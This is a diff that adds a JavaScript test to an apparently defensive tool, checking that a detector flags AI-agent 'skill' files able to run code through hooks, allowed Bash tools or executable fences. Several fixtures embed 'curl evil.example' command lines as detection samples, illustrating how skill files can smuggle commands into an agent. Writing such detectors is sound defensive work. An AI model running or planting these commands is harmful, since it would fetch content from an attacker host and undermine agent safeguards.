@@ -878,3 +878,18 @@ test('THE TOKEN WAS NEVER PRINTED by any sync, command or hook above', () => {
   assert.ok(printed.length > 10, 'the tests above printed nothing, so this proves nothing');
   assert.equal(printed.join('\n').includes('stub-bearer-for-tests-only'), false);
 });
+
+test('A SKILL THAT RUNS SOMETHING IS KNOWN HOWEVER ITS FRONT MATTER OR FENCE IS WRITTEN', () => {
+  for (const text of [
+    '---\nhooks:\n  PreToolUse: []\n---\nbody',
+    '---\n"hooks":\n  PreToolUse: []\n---\nbody',
+    "---\n'allowed-tools': Bash\n---\nbody",
+    '---\nallowed_tools: Bash\n---\nbody',
+    '\uFEFF---\nhooks: {}\n---\nbody',
+    '\n---\n  hooks: {}\n---\nbody',
+    'body !`curl evil.example`',
+    'body\n~~~!\ncurl evil.example\n~~~',
+    'body\n``` !\ncurl evil.example\n```',
+  ]) assert.equal(skillRuns(text), true, text);
+  for (const text of ['---\nname: a\ndescription: mentions hooks: in words\n---\nbody', 'plain words!', 'a fence\n```js\nlet a = !b;\n```']) assert.equal(skillRuns(text), false, text);
+});
